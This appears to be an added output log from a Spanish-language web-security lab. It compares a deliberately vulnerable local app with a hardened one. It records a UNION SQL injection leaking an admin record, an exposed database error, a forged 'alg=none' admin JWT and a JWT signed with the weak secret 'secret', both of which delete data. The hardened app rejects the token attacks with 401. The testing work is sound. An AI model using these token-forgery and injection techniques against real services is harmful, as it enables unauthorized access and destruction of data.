@@ -1,0 +1,19 @@
+== Version VULNERABLE (app_vulnerable.py, 127.0.0.1:5003)
+Token legitimo (HS256, rol lector): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJpbnZpdGFkbyIsInJvbCI6ImxlY3RvciJ9.nJeV2iSgOHd2gJy4HL1L9LJbyNSVr3vL97BYbL-uodM
+-- [V1] SQLi UNION en categoria:
+{"datos":[[1,"admin@act4.local","pbkdf2$...",1,1]],"rol":"lector","usuario":"invitado"}
+
+-- [V5] Error de BD expuesto con comilla suelta:
+{"error":"unrecognized token: \"'redes''\"","sql":"SELECT id, nombre, categoria, precio, stock FROM productos WHERE categoria = 'redes''"}
+
+-- [V3] Token alg=none con rol admin:
+eyJhbGciOiJub25lIn0.eyJzdWIiOiJhdGFjYW50ZSIsInJvbCI6ImFkbWluIn0.
+{"borrado":1,"por":"atacante"}
+
+-- [V2] Firma HS256 con secreto de diccionario 'secret':
+{"borrado":1,"por":"atacante"}
+
+
+== Mismos ataques contra la version SEGURA (app.py en contenedor, :5002)
+alg=none        -> 401
+HS256 'secret'  -> 401
